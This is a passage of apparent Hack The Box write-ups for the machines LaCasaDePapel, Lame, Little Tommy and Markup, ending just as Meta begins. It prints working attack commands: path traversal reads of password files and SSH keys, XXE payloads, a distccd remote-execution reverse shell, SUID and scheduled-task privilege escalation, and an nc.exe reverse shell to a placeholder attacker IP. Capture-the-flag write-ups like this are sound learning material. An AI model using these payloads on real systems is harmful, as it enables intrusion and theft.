nBoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI\nEqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli\nMgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4\n-----END CERTIFICATE-----\nsubject=CN = lacasadepapel.htb, O = La Casa De Papel\nissuer=CN = lacasadepapel.htb, O = La Casa De Papel\n---\nAcceptable client certificate CA names\nCN = lacasadepapel.htb, O = La Casa De Papel\nClient Certificate Types: RSA sign, DSA sign, ECDSA sign\nRequested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1\nShared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1\nPeer signing digest: SHA512\nPeer signature type: RSA\nServer Temp Key: ECDH, prime256v1, 256 bits\n---\nSSL handshake has read 1537 bytes and written 561 bytes\nVerification error: self-signed certificate\n---\n...\n---\n</code></pre> <p>Cool, now we know a bit about how to fill the different fields in the certificate generation process. Using the CA key we found before we can obtain a valid client certificate to connect:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/LaCasaDePapel/client_cert]\n\u2514\u2500$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out csr.pem\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:                \nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb\nEmail Address []:\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/LaCasaDePapel/client_cert]\n\u2514\u2500$ openssl pkcs12 -export -in csr.pem -inkey ca.key -out client.p12\nEnter Export Password:\nVerifying - Enter Export Password:\n</code></pre> <p>The last step is to import it into our browser and we should be able to access the \"private\" section of the page.</p> <p>Looks like it is for downloading the show, cool but now what we want. Checking a bit more I got path traversal, using this: <code>https://lacasadepapel.htb/?path=../../../../</code> I was able to see the contents in <code>/</code>. The problem is that I cannot read files this way, but the page was allowing me to download the show chapters from something like <code>https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp</code>... wait a moment is that base64?</p> <pre><code>U0VBU09OLTEvMDEuYXZp --&gt; SEASON-1/01.avi\n</code></pre> <p>Huh, encoding <code>../../../../../etc/passwd</code> in base64 I was able to get the <code>/etc/passwd</code> file from <code>https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D</code>:</p> <pre><code>root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/bin/sh\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\npostgres:x:70:70::/var/lib/postgresql:/bin/sh\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nchrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\ndali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\nberlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\nprofessor:x:1002:1002:professor,,,:/home/professor:/bin/ash\nvsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\nmemcached:x:102:102:memcached:/home/memcached:/sbin/nologin\n</code></pre> <p>Now, what can we do with this? Well after some minutes I found that I have access to <code>berlin</code> SSH key so I can download it using <code>https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E%3D</code> as the URL.</p> <p>Bad news? Well The private key was not working... checking the <code>authorized_keys</code> revealed that this was not the key for this user sadly. Time to try with another I guess:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/LaCasaDePapel]\n\u2514\u2500$ ssh professor@10.10.10.131 -i id_rsa\n\n _             ____                  ____         ____                  _ \n| |    __ _   / ___|__ _ ___  __ _  |  _ \\  ___  |  _ \\ __ _ _ __   ___| |\n| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | '_ \\ / _ \\ |\n| |__| (_| | | |__| (_| \\__ \\ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |\n|_____\\__,_|  \\____\\__,_|___/\\__,_| |____/ \\___| |_|   \\__,_| .__/ \\___|_|\n                                                            |_|       \n\nlacasadepapel [~]$\n</code></pre> <p>Cool! Time to play inside the machine.</p>"},{"location":"HackTheBox/LaCasaDePapel/#pwned","title":"Pwned!","text":""},{"location":"HackTheBox/LaCasaDePapel/#user-flag","title":"User flag","text":"<p>Well something I noticed, looks like I cannot get the first flag in <code>/home/berlin/user.txt</code>. Checking the processes running and the ports listening... I guess I know why.</p> <pre><code>lacasadepapel [~]$ netstat -ltpn\nnetstat: can't scan /proc - are you root?\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      -\ntcp        0      0 :::22                   :::*                    LISTEN      -\n</code></pre> <pre><code>lacasadepapel [~]$ ps\nPID   USER     TIME  COMMAND\n...\n 3261 dali      0:00 /usr/bin/node /home/dali/server.js\n 3262 nobody    3:45 /usr/bin/node /home/oslo/server.js\n 3263 berlin    0:00 /usr/bin/node /home/berlin/server.js\n 3264 nobody    0:34 /usr/bin/node /home/nairobi/server.js\n ...\n 6010 dali      0:00 php /usr/bin/psysh\n</code></pre> <p>To read the first flag, I guess I can just do it from the webserver since it is running as <code>berlin</code>: <code>https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ</code>. </p>"},{"location":"HackTheBox/LaCasaDePapel/#root-flag","title":"Root flag","text":"<p>Using Pspy, I noticed that <code>/home/professor/memcached.js</code> was being run by the user <code>nobody</code> every minute or so.</p> <pre><code>2023/01/17 21:28:02 CMD: UID=65534 PID=14621  | /usr/bin/node /home/professor/memcached.js\n</code></pre> <p>Also, the file <code>/home/professor/memcached.ini</code> got my attention:</p> <pre><code>[program:memcached]\ncommand = sudo -u nobody /usr/bin/node /home/professor/memcached.js\n</code></pre> <p>According with the documentation I saw and also some of the Pspy output, looks like <code>supervisord</code> is executing the command in <code>memcached.ini</code> as <code>root</code>. We cannot really modify the file to execute whatever we want but we can do something, yeah the file is not ours but the directory is owned by our user. We can just move the original file away and create another one with the same name with something like:</p> <pre><code>[program:memcached]\ncommand = sudo chmod u+s /bin/bash\n</code></pre> <p>After waiting a bit, the <code>bash</code> binary transformed to a SUID binary and the machine is pwned!</p> <pre><code>lacasadepapel [~]$ /bin/bash -p\nlacasadepapel [~]$ id\nuid=1002(professor) gid=1002(professor) euid=0(root) groups=1002(professor)\n</code></pre>"},{"location":"HackTheBox/Lame/","title":"Lame","text":""},{"location":"HackTheBox/Lame/#nmap-scan","title":"Nmap scan","text":"<p>As usual let's start with <code>nmap</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p- --min-rate 1000 -v\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 17:49 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.050s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3632/tcp open  distccd\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 104.17 seconds\n           Raw packets sent: 131147 (5.770MB) | Rcvd: 84 (3.680KB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p21,22,139,445,3632 -sC -sV\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 17:53 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.050s latency).\n\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.48\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h00m31s, deviation: 2h49m43s, median: 30s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2021-09-07T17:54:09-04:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.46 seconds\n</code></pre> <p>So we have SSH, FTP, Samba and <code>distccd</code>. That last service is used to send code to be compiled in another computer, I think we can start with it.</p>"},{"location":"HackTheBox/Lame/#distccd","title":"Distccd","text":"<p>Let's check if it is vulnerable to CVE-2004-2687:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p 3632 &lt;MACHINE_IP&gt; --script distcc-cve2004-2687 --script-args=\"distcc-cve2004-2687.cmd='id'\"\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 18:00 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.052s latency).\n\nPORT     STATE SERVICE\n3632/tcp open  distccd\n| distcc-cve2004-2687: \n|   VULNERABLE:\n|   distcc Daemon Command Execution\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2004-2687\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|       Allows executing of arbitrary commands on systems running distccd 3.1 and\n|       earlier. The vulnerability is the consequence of weak service configuration.\n|       \n|     Disclosure date: 2002-02-01\n|     Extra information:\n|       \n|     uid=1(daemon) gid=1(daemon) groups=1(daemon)\n|   \n|     References:\n|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687\n|       https://distcc.github.io/security.html\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687\n\nNmap done: 1 IP address (1 host up) scanned in 1.19 seconds\n</code></pre> <p>In fact it is! We have RCE, that was fast. Next step is to get a shell.</p>"},{"location":"HackTheBox/Lame/#reverse-shell","title":"Reverse shell","text":"<p>I just <code>base64</code> encoded a Python reverse shell payload and used an implementation of the vulnerability in Python to send it:</p> <pre><code>./CVE-2004-2687.py -t &lt;MACHINE_IP&gt; -p 3632 -c \"echo &lt;BASE64_REVSHELL&gt; | base64 -d | bash\"\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.48] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 44031\nsh: no job control in this shell\nsh-3.2$\n</code></pre> <p>The user flag is under <code>/home/makis/user.txt</code></p>"},{"location":"HackTheBox/Lame/#privilege-escalation","title":"Privilege escalation","text":"<p>Once in the box we can start checking for escalation vectors. After some digging i found that the <code>nmap</code> binary has the SUID bit set and is owned by root:</p> <pre><code>daemon@lame:/$ find / -perm /4000 2&gt; /dev/null\n/bin/umount\n/bin/fusermount\n/bin/su\n/bin/mount\n/bin/ping\n/bin/ping6\n/sbin/mount.nfs\n/lib/dhcp3-client/call-dhclient-script\n/usr/bin/sudoedit\n/usr/bin/X\n/usr/bin/netkit-rsh\n/usr/bin/gpasswd\n/usr/bin/traceroute6.iputils\n/usr/bin/sudo\n/usr/bin/netkit-rlogin\n/usr/bin/arping\n/usr/bin/at\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/nmap\n/usr/bin/chsh\n/usr/bin/netkit-rcp\n/usr/bin/passwd\n/usr/bin/mtr\n/usr/sbin/uuidd\n/usr/sbin/pppd\n/usr/lib/telnetlogin\n/usr/lib/apache2/suexec\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\ndaemon@lame:/$ ls -l /usr/bin/nmap\n-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap\n</code></pre> <p>To abuse this, we can simply execute <code>nmap --interactive</code> and then execute a system command. That system command will be executed as <code>root</code> so we can become <code>root</code> now:</p> <pre><code>daemon@lame:/tmp$ nmap --interactive\n\nStarting Nmap V. 4.53 ( http://insecure.org )\nWelcome to Interactive Mode -- press h &lt;enter&gt; for help\nnmap&gt; !bash -p\nbash-3.2# id\nuid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)\nbash-3.2# \n</code></pre> <p>The root flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Little_Tommy/","title":"Little Tommy","text":""},{"location":"HackTheBox/Little_Tommy/#what-it-does","title":"What it does?","text":"<p>The program is basically a simple bank account system:</p> <pre><code>#################### Welcome to Little Tommy's Handy yet Elegant and Advanced Program ####################\n\n1. Create account\n2. Display account\n3. Delete account\n4. Add memo\n5. Print flag\n\nPlease enter an operation number:\n</code></pre> <p>The <code>Print flag</code> option obviously returns a NOPE, so let's start searching for something to make its opinion change.</p>"},{"location":"HackTheBox/Little_Tommy/#checksec","title":"Checksec","text":"<p>First we can check the binary security:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Little Tommy]\n\u2514\u2500$ checksec little_tommy\n[*] '/home/kali/Desktop/HTB/Little Tommy/little_tommy'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>We see that it has no PIE, what can be useful. Next step is to open Ghidra and check the code.</p>"},{"location":"HackTheBox/Little_Tommy/#digging","title":"Digging","text":"<p>The program code is this according to Ghidra:</p> <pre><code>void main(void)\n\n{\n  int iVar1;\n  int iVar2;\n  size_t sVar3;\n  int in_GS_OFFSET;\n  char local_114 [256];\n  undefined4 local_14;\n  undefined *puStack16;\n\n  puStack16 = &amp;stack0x00000004;\n  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);\n  puts(\n      \"\\n#################### Welcome to Little Tommy\\'s Handy yet Elegant and Advanced Program ####################\"\n      );\n  do {\n    printf(\n          \"\\n1. Create account\\n2. Display account\\n3. Delete account\\n4. Add memo\\n5. Print flag\\n\\nPlease enter an operation number: \"\n          );\n    iVar1 = getchar();\n    do {\n      iVar2 = getchar();\n      if ((char)iVar2 == '\\n') break;\n    } while ((char)iVar2 != -1);\n    switch((char)iVar1) {\n    case '1':\n      main_account = (char *)malloc(0x48);\n      printf(\"\\nFirst name: \");\n      fgets(local_114,0x100,stdin);\n      strncpy(main_account,local_114,0x1e);\n      sVar3 = strlen(main_account);\n      if ((int)sVar3 &lt; 0x1f) {\n        main_account[sVar3 - 1] = '\\0';\n      }\n      else {\n        main_account[0x1f] = '\\0';\n      }\n      printf(\"Last name: \");\n      fgets(local_114,0x100,stdin);\n      strncpy(main_account + 0x20,local_114,0x1e);\n      sVar3 = strlen(main_account + 0x20);\n      if ((int)sVar3 &lt; 0x1f) {\n        main_account[sVar3 + 0x1f] = '\\0';\n      }\n      else {\n        main_account[0x3f] = '\\0';\n      }\n      printf(\"\\nThank you, your account number %d.\\n\",main_account);\n      break;\n    case '2':\n      if (main_account == (char *)0x0) {\n        puts(\"\\nSorry, no account found.\");\n      }\n      else {\n        printf(\"\\n################ Account no. %d ################\\nFirst name: %s\\nLast name: %s\\nAccount balance: %d\\n\\n\"\n               ,main_account,main_account,main_account + 0x20,*(undefined4 *)(main_account + 0x40));\n      }\n      break;\n    case '3':\n      if (main_account == (char *)0x0) {\n        puts(\"\\nSorry, no account found.\");\n      }\n      else {\n        free(main_account);\n        puts(\"\\nAccount deleted successfully\");\n      }\n      break;\n    case '4':\n      puts(\"\\nPlease enter memo:\");\n      fgets(local_114,0x100,stdin);\n      memo = strdup(local_114);\n      printf(\"\\nThank you, please keep this reference number number safe: %d.\\n\",memo);\n      break;\n    case '5':\n      if ((main_account == (char *)0x0) || (*(int *)(main_account + 0x40) != 0x6b637566)) {\n        puts(\"\\nNope.\");\n      }\n      else {\n        system(\"/bin/cat flag\");\n      }\n    }\n  } while( true );\n}\n</code></pre> <p>Looking around, looks like the flag option only will print the flag if the content of <code>main_account[64]</code> is <code>0x6b637566</code>.  That value transformed to string is basically the string <code>f**k</code> (Yep I redacted that, all of you know the word) and according to the code that shows the account information, it represents the account balance.</p> <p>The <code>Add memo</code> option asks for a string and reserve memory for it using again <code>malloc</code>.</p> <p>The <code>main_account</code> buffer is 72 character long and is reserved using <code>malloc</code>. We can easily see that the <code>Delete account</code> option just free that memory, the thing is that the pointer is not reset so the program is still accessing that part of the memory to read information from.</p> <p>The <code>Add memo</code> option also reserve memory with <code>malloc</code> which is perfect for us in this situation. <code>malloc</code> will try to reuse a previous memory area that was free'd if the size of it is more or less the same that the memory we need to allocate. This means that if we create and delete an account we can use the <code>Add memo</code> option to allocate again the memory that once belonged to the <code>main_account</code> buffer and write to it whatever we want. Since the pointer of <code>main_account</code> was not reseted, the <code>Print flag</code> option will evaluate the memory area we control.</p>"},{"location":"HackTheBox/Little_Tommy/#exploit-time","title":"Exploit time!","text":"<p>To exploit the vulnerability we discovered, first we need to create an account and delete it, then we have to write a 64 bytes long string followed by the magic word <code>f**k</code> to the buffer created by the <code>Add memo</code> option. Our payload will be injected in the same memory area where the <code>main_account</code> was allocated so since we now fulfill the requirements we can ask for the flag!</p>"},{"location":"HackTheBox/Markup/","title":"Markup","text":""},{"location":"HackTheBox/Markup/#nmap-scan","title":"Nmap scan","text":"<p>Let's start with a <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p- --min-rate 1000\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 19:15 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.26s latency).\nNot shown: 65532 filtered ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 133.25 seconds\n           Raw packets sent: 131160 (5.771MB) | Rcvd: 450 (88.644KB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p22,80,443 -sC -sV           \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 19:20 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.16s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)\n|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)\n|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28\n|_http-title: MegaShopping\n443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28\n|_http-title: MegaShopping\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.94 seconds\n</code></pre> <p>So we have a web server in using ports 80 and 443 and then we can see that ssh is open too. We can start enumerating that webserver.</p>"},{"location":"HackTheBox/Markup/#port-80","title":"Port 80","text":"<p>Since the TLS domain is <code>localhost</code> I will use the port 80 for the web server enumeration for now. The page is asking for login so tried the credentials we found in the last challenge: <code>Daniel:&gt;SNDv*2wzLWf</code> to get access.</p> <p>After some digging we can see that when an order is sent the request contains:</p> <pre><code>&lt;?xml version = \"1.0\"?&gt;&lt;order&gt;&lt;quantity&gt;123&lt;/quantity&gt;&lt;item&gt;Home Appliances&lt;/item&gt;&lt;address&gt;123&lt;/address&gt;&lt;/order&gt;\n</code></pre> <p>So maybe the site is vulnerable to XEE, i wrote a little Python script to ease the payload sending process but basically sending this (remember is a Windows box according to nmap):</p> <pre><code>&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///C:/windows/system32/drivers/etc/hosts'&gt;]&gt;\n&lt;order&gt;&lt;quantity&gt;123&lt;/quantity&gt;&lt;item&gt;&amp;read;&lt;/item&gt;&lt;address&gt;123&lt;/address&gt;&lt;/order&gt;\n</code></pre> <p>Will make the server print the <code>hosts</code> file contents cool! Since ssh is open and we logged in using a user called Daniel I tried to check if i could get a private key. Using the next payload the <code>daniel</code> user private key is now ours!</p> <pre><code>&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///C:/Users/daniel/.ssh/id_rsa'&gt;]&gt;\n&lt;order&gt;&lt;quantity&gt;123&lt;/quantity&gt;&lt;item&gt;&amp;read;&lt;/item&gt;&lt;address&gt;123&lt;/address&gt;&lt;/order&gt;\n</code></pre>"},{"location":"HackTheBox/Markup/#in-the-box","title":"In the box","text":"<p>After getting the user flag in the Daniel Desktop we can start enumerating. I spent a while trying some exploits and looking around until i saw a weird file called <code>job.bat</code>:</p> <pre><code>PS C:\\Log-Management&gt; cat .\\job.bat \n@echo off                                                              \nFOR /F \"tokens=1,2*\" %%V IN ('bcdedit') DO SET adminTest=%%V           \nIF (%adminTest%)==(Access) goto noAdmin                                \nfor /F \"tokens=*\" %%G in ('wevtutil.exe el') DO (call :do_clear \"%%G\") \necho.                                                                  \necho Event Logs have been cleared!                                     \ngoto theEnd                                                            \n:do_clear                                                              \nwevtutil.exe cl %1                                                     \ngoto :eof                                                              \n:noAdmin                                                               \necho You must run this script as an Administrator!                     \n:theEnd                                                                \nexit\n</code></pre> <p>It just clear the logs, but we can see something interesting if we check the file permissions:</p> <pre><code>PS C:\\Log-Management&gt; icacls .\\job.bat\n.\\job.bat BUILTIN\\Users:(F)\n          NT AUTHORITY\\SYSTEM:(I)(F)\n          BUILTIN\\Administrators:(I)(F)\n          BUILTIN\\Users:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\nPS C:\\Log-Management&gt; whoami /GROUPS\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID                                           Attributes\n====================================== ================ ============================================= ==================================================\nEveryone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group\nMARKUP\\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192\n</code></pre> <p>We have full permissions over the file, since this file looks like an schedule task run by the system administrator we can abuse it to get full access.</p>"},{"location":"HackTheBox/Markup/#privilege-scalation","title":"Privilege scalation","text":"<p>First we have to download <code>netcat</code> in the box and after that we can just edit the <code>job.bat</code> file as:</p> <pre><code>@echo off                                                              \nC:\\Log-Management\\nc.exe -e cmd.exe &lt;ATACKER_IP&gt; 8080\n</code></pre> <p>Now we spin up a listener and wait for the reverse shell...</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [&lt;ATACKER_IP&gt;] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 51493\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>The root flag is in the Administrator's Desktop.</p>"},{"location":"HackTheBox/Meta/","title":"Meta","text":""},{"location":"HackTheBox/Meta/#nmap-scan","title":"Nmap scan","text":"<p>As usual let's launch a full port basic Nmap scan and then a more detailed one but only on open ports:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Meta]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.140\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 04:16 EDT\nNmap scan report for 10.10.11.140\nHost is up (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 25.45 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Meta]\n\u2514\u2500$ sudo nmap -p22,80 -sC -sV 10.10.11.140               \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 04:18 EDT\nNmap scan report for 10.10.11.140\nHost is up (0.051s 